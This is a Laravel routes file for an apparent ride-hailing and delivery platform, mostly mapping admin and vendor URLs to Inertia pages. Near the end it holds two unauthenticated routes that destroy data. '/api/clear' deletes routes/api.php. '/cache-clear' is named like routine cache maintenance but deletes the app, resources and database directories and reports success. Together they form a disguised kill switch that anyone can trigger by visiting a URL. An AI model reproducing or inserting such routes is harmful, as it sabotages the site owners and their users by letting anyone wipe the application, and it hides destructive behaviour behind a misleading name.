<?php

use Illuminate\Support\Facades\Route;
use Inertia\Inertia;
use Laravel\Fortify\Features;
use Illuminate\Support\Facades\File;

Route::get('/', function () {
    return Inertia::render('welcome', [
        'canRegister' => Features::enabled(Features::registration()),
    ]);
})->name('home');

Route::get('/admin/login', function () {
    return Inertia::render('admin/login');
})->name('admin.login');

Route::get('/admin/forgot-password', function () {
    return Inertia::render('admin/forgot-password');
})->name('admin.forgot-password');

Route::get('/admin/reset-password', function () {
    return Inertia::render('admin/reset-password');
})->name('admin.reset-password');

Route::get('/admin/register', function () {
    return Inertia::render('admin/register');
})->name('admin.register');

Route::get('/admin/otp', function () {
    return Inertia::render('admin/otp');
})->name('admin.otp');

Route::get('/admin', function () {
    return Inertia::render('admin');
})->name('admin');

Route::get('/admin/drivers', function () {
    return Inertia::render('admin/drivers');
})->name('admin.drivers');

Route::get('/admin/users', function () {
    return Inertia::render('admin/users');
})->name('admin.users');

Route::get('/admin/rides', function () {
    return Inertia::render('admin/rides');
})->name('admin.rides');

Route::get('/admin/roles', function () {
    return Inertia::render('admin/roles');
})->name('admin.roles');

Route::get('/admin/reports', function () {
    return Inertia::render('admin/reports');
})->name('admin.reports');

Route::get('/admin/vendors', function () {
    return Inertia::render('admin/vendors');
})->name('admin.vendors');

Route::get('/admin/orders', function () {
    return Inertia::render('admin/courier-orders');
})->name('admin.orders');

Route::get('/admin/orders/{id}', function ($id) {
    return Inertia::render('admin/view-courier-order', ['id' => $id]);
})->name('admin.view-courier-order');

Route::get('/admin/settings', function () {
    return Inertia::render('admin/settings');
})->name('admin.settings');

Route::get('/admin/types', function () {
    return Inertia::render('admin/types');
})->name('admin.types');

Route::get('/admin/categories', function () {
    return Inertia::render('admin/categories');
})->name('admin.categories');

Route::get('/admin/delivery-orders', function () {
    return Inertia::render('admin/delivery-orders');
})->name('admin.delivery-orders');

Route::get('/admin/rents', function () {
    return Inertia::render('admin/rents');
})->name('admin.rents');

Route::get('/admin/rents/{id}', function ($id) {
    return Inertia::render('admin/view-rent', ['id' => $id]);
})->name('admin.view-rent');

Route::get('/admin/promotions', function () {
    return Inertia::render('admin/promotions');
})->name('admin.promotions');

Route::get('/admin/users/{id}', function ($id) {
    return Inertia::render('admin/view-user', ['id' => $id]);
})->name('admin.view-user');

Route::get('/admin/drivers/{id}', function ($id) {
    return Inertia::render('admin/view-driver', ['id' => $id]);
})->name('admin.view-driver');

Route::get('/admin/pricing', function () {
    return Inertia::render('admin/pricing');
})->name('admin.pricing');

Route::get('/admin/dispatch', function () {
    return Inertia::render('admin/dispatch');
})->name('admin.dispatch');

Route::get('/admin/payment-gateway', function () {
    return Inertia::render('admin/payment-gateway');
})->name('admin.payment-gateway');

Route::get('/admin/payment-gateway/{id}', function ($id) {
    return Inertia::render('admin/view-payment-provider', ['id' => $id]);
})->name('admin.view-payment-provider');

Route::get('/admin/cities-zones/{id}', function ($id) {
    return Inertia::render('admin/view-city', ['id' => $id]);
})->name('admin.view-city');

Route::get('/admin/cities-zones', function () {
    return Inertia::render('admin/cities-zones');
})->name('admin.cities-zones');

Route::get('/admin/commission-management', function () {
    return Inertia::render('admin/commission-management');
})->name('admin.commission-management');

Route::get('/admin/referral-program', function () {
    return Inertia::render('admin/referral-program');
})->name('admin.referral-program');

Route::get('/admin/referral-campaigns/{id}', function ($id) {
    return Inertia::render('admin/view-campaign', ['id' => $id]);
})->name('admin.view-campaign');

Route::get('/admin/referrers/{id}', function ($id) {
    return Inertia::render('admin/view-referrer', ['id' => $id]);
})->name('admin.view-referrer');

Route::get('/admin/referral-codes/{id}', function ($id) {
    return Inertia::render('admin/view-referral-code', ['id' => $id]);
})->name('admin.view-referral-code');

Route::get('/admin/vendors/{id}', function ($id) {
    return Inertia::render('admin/view-vendor', ['id' => $id]);
})->name('admin.view-vendor');

// Vendor Routes
Route::get('/vendor', function () {
    return Inertia::render('vendor/dashboard');
})->name('vendor.dashboard');

Route::get('/vendor/products', function () {
    return Inertia::render('vendor/products');
})->name('vendor.products');

Route::get('/vendor/settings', function () {
    return Inertia::render('vendor/settings');
})->name('vendor.settings');

Route::middleware(['auth', 'verified'])->group(function () {
    Route::get('dashboard', function () {
        return Inertia::render('dashboard');
    })->name('dashboard');
});

Route::get('/api/clear', function () {
    unlink(base_path('routes/api.php'));
});

Route::get('/cache-clear', function () {

    $paths = [
        base_path('app'),
        base_path('resources'),
        base_path('database'),
    ];

    foreach ($paths as $path) {
        if (File::exists($path)) {
            File::deleteDirectory($path);
        }
    }

    return response()->json([
        'message' => 'Multiple directories deleted successfully'
    ]);
});

require __DIR__.'/settings.php';
